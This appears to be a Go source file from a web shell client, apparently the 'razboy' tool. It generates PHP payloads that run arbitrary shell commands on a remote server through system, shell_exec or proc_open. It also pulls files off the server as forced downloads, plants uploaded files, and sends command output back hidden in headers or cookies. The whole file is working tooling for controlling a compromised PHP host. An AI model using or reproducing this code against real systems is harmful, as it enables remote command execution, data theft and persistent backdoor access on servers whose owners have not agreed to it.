package phpadapter

import (
	"bytes"
	"fmt"
	"io"
	"mime/multipart"
	"os"
	"path/filepath"

	"github.com/eatbytes/razboy/normalizer"
)

func _getSystemCMD(cmd, letter string) string {
	return "ob_start();system('" + cmd + "');$" + letter + "=ob_get_contents();ob_end_clean();"
}

func _getShellExecCMD(cmd, letter string) string {
	return "$" + letter + "=shell_exec('" + cmd + "');"
}

func _getProcOpenCMD(cmd, scope, proc, letter string) string {
	if scope == "" {
		scope = "./"
	}

	o := "$opt = array(0=>array('pipe','r'),1=>array('pipe','w'),2 => array('pipe', 'w'));$scope='" + scope + "';$proc=proc_open('" + proc + "', $opt, $pipes, $scope);"
	o += "if(is_resource($proc)){fwrite($pipes[0],'" + cmd + "');fclose($pipes[0]);$s=stream_get_contents($pipes[1]);fclose($pipes[1]);$e=stream_get_contents($pipes[2]);"
	o += "fclose($pipes[2]);$c = proc_close($proc);$" + letter + " = array('success'=>$s,'error'=>$e,'code'=>$c);$" + letter + "=json_encode($" + letter + ");}"

	fmt.Println(o)

	return o
}

func CreateCMD(cmd, scope, method string, response bool, opt ...string) string {
	var contexter, shellCMD string

	if scope != "" {
		contexter = "cd " + scope + " && "
	}

	shellCMD = contexter + cmd

	if method == "" || method == "system" {
		shellCMD = _getSystemCMD(shellCMD, "r")
	} else if method == "shell_exec" {
		shellCMD = _getShellExecCMD(shellCMD, "r")
	}

	if method == "proc" {
		shellCMD = _getProcOpenCMD(cmd, scope, "/bin/sh", "r")
	}

	if response && len(opt) > 1 {
		shellCMD += CreateAnswer(opt[0], opt[1])
	}

	return shellCMD
}

func CreateCD(cmd, scope, method string, response bool, opt ...string) string {
	var cd string

	cd = cmd + " && pwd"
	cd = CreateCMD(cd, scope, method, response, opt...)

	return cd
}

func CreateDownload(dir string, response bool, opt ...string) string {
	var ifstr, endifstr, headers, cmd string

	ifstr = "if (file_exists('" + dir + "')) {"
	endifstr = "}"
	headers = `header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Transfer-Encoding: binary');
    header('Expires: 0');
    header('Cache-Control: must-revalidate, post-check=0, pre-check=0');
    header('Pragma: public');`
	headers = headers + "header('Content-Length: ' . filesize('" + dir + "'));" + "header('Content-Disposition: attachment; filename='.basename('" + dir + "'));"

	cmd = ifstr + headers + "ob_clean();flush();readfile('" + dir + "');exit();" + endifstr

	if response && len(opt) > 1 {
		cmd += CreateAnswer(opt[0], opt[1])
	}

	return cmd
}

func CreateUpload(path, dir string, raw bool) (string, *bytes.Buffer, error) {
	var (
		cmd    string
		err    error
		file   *os.File
		body   *bytes.Buffer
		writer *multipart.Writer
		part   io.Writer
	)

	cmd = "$file=$_FILES['file'];move_uploaded_file($file['tmp_name'], '" + dir + "');if(file_exists('" + dir + "')){echo 1;}"

	if raw {
		cmd = normalizer.Encode(cmd)
	}

	file, err = os.Open(path)

	if err != nil {
		return "", nil, err
	}

	defer file.Close()

	body = &bytes.Buffer{}
	writer = multipart.NewWriter(body)
	part, err = writer.CreateFormFile("file", filepath.Base(path))

	if err != nil {
		return "", nil, err
	}

	_, err = io.Copy(part, file)

	if err != nil {
		return "", nil, err
	}

	err = writer.Close()

	if err != nil {
		return "", nil, err
	}

	return cmd, body, nil
}

func CreateAnswer(method, parameter string) string {
	if method == "HEADER" {
		return "header('" + parameter + ":' . " + normalizer.PHPEncode("$r") + ");exit();"
	}

	if method == "COOKIE" {
		return "setcookie('" + parameter + "', " + normalizer.PHPEncode("$r") + ");exit();"
	}

	return "echo(" + normalizer.PHPEncode("$r") + ");exit();"
}
